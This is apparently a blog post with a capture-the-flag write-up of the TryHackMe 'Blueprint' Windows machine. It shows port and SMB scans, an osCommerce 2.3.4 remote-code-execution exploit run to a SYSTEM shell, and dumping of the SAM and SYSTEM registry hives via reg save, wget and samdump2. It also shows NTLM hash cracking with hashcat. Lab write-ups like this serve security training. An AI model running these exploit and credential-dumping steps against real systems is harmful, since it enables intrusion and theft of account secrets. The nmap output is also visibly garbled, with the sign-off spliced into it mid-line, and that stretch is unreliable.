---
layout: post
title: Try Hack Me - Blueprint
#permalink: /thm/blueprint
disass:
  - url: /assets/img/thm-blueprint/blueprint-1.png
    image_path: /assets/img/thm-blueprint/blueprint-1.png
    title: description
  - url: /assets/img/thm-blueprint/blueprint-2.png
    image_path: /assets/img/thm-blueprint/blueprint-2.png
    title: crackstation
slug: thm-blueprint
categories:
  - tryhackme
tags:
  - windows
  - cve
---

## Challenge description

[https://tryhackme.com/room/blueprint](https://tryhackme.com/room/blueprint)

Blueprint is an easy Windows box on TryHackMe

![description](/assets/img/thm-blueprint/blueprint-1.png "description")

## Reconnaissance / Enumeration

### Port scanning and service identification

```
$ rustscan -a $ip -r 1-65535 -- -A -sC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍
[...]
PORT      STATE SERVICE      REASON  VERSION
80/tcp    open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:
|_  Supported Methods: GET
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     syn-ack Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
[...]
445/tcp   open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        syn-ack MariaDB (unauthorized)
8080/tcp  open  http         syn-ack Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| http-methods:
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  PotentiaThanks for reading <3

h3x
en  unknown      syn-ack
49154/tcp open  unknown      syn-ack
49158/tcp open  unknown      syn-ack
49159/tcp open  unknown      syn-ack
49160/tcp open  unknown      syn-ack
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 41214/tcp): CLEAN (Timeout)
|   Check 2 (port 10095/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 13542/udp): CLEAN (Failed to receive data)
|   Check 4 (port 25003/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2022-01-14T12:57:00
|_  start_date: 2022-01-14T12:54:00
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
```

In short:

- 443/8080 : Web server running Apache
- 80 : Web server running IIS
- 3306 : MariaDB database
- 139/445 : Samba
- 135/49XXX : RPC

### SMB Enumeration

Start by listing samba shares:

```
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $ip
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-14 13:04 UTC
Nmap scan report for 10.10.0.86
Host is up (0.27s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-users:
|   BLUEPRINT\Administrator (RID: 500)
|     Description: Built-in account for administering the computer/domain
|     Flags:       Password does not expire, Normal user account
|   BLUEPRINT\Guest (RID: 501)
|     Description: Built-in account for guest access to the computer/domain
|     Flags:       Password not required, Password does not expire, Normal user account
|   BLUEPRINT\Lab (RID: 1000)
|     Full name:   Steve
|_    Flags:       Normal user account
| smb-enum-shares:
|   account_used: guest
|   \\10.10.0.86\ADMIN$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.0.86\C$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.0.86\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   \\10.10.0.86\Users:
|     Type: STYPE_DISKTREE
|     Comment:
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.10.0.86\Windows:
|     Type: STYPE_DISKTREE
|     Comment:
|     Anonymous access: <none>
|_    Current user access: READ

Nmap done: 1 IP address (1 host up) scanned in 76.14 seconds
```

After browsing all the shares accessible anonymously, there's nothing really interesting

### Web Enumeration

#### Port 443

There's an OS Commerce online shop at https://2.2.2.2/oscommerce/2.3.4/catalog

Check for known exploit :

```
$ searchsploit oscommerce | grep '2.3.4'
osCommerce 2.3.4 - Multiple Vulnerabilities                      | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection                    | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection                 | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                  | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting     | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                       | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                       | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)                   | php/webapps/50128.py
```

## Exploitation && Foothold && Pwn

```
$ python3 /usr/share/exploitdb/exploits/php/webapps/50128.py http://$ip:8080/oscommerce-2.3.4/catalog   
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ whoami
nt authority\system
```

We got a shell of the target machine as "nt authority/system" which mean we already own the machine:

```
RCE_SHELL$ more c:\users\administrator\desktop\root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

Next we need to get the hash for 'lab' user and crack it. Since we already have a root foothold on the machine, we just need to export and copy SYSTEM/SAM into the site root directory:

```
RCE_SHELL$ reg save HKLM\SAM C:\xampp\htdocs\oscommerce-2.3.4\sam
The operation completed successfully.

RCE_SHELL$ reg save HKLM\SYSTEM C:\xampp\htdocs\oscommerce-2.3.4\system
The operation completed successfully.
```

```
$ wget http://10.10.0.86:8080/oscommerce-2.3.4/system
2022-01-14 13:39:08 (414 KB/s) - 'system' saved [12804096/12804096]

$ wget http://10.10.0.86:8080/oscommerce-2.3.4/sam
2022-01-14 13:39:21 (25.0 KB/s) - 'sam' saved [24576/24576]

$ samdump2 ./system ./sam
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

We have Lab's NTLM hash, let's crack this:

```
$ echo '30e87bf999828446a1c1209ddde4c450' > hash.txt && hashcat -m 0 -a 0 ./hash.txt /opt/wordlists/rockyou.txt

Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 11484.4 kH/s (0.18ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 0/1 (0.00%) Digests

$ echo '30e87bf999828446a1c1209ddde4c450' > hash.txt && hashcat -m 0 -a 0 ./hash.txt /opt/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt

Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 12110.0 kH/s (0.18ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 0/1 (0.00%) Digests
```

Well.. let's try a much more simple option :

![crackstation](/assets/img/thm-blueprint/blueprint-2.png "crackstation")

Thanks for reading <3

h3x
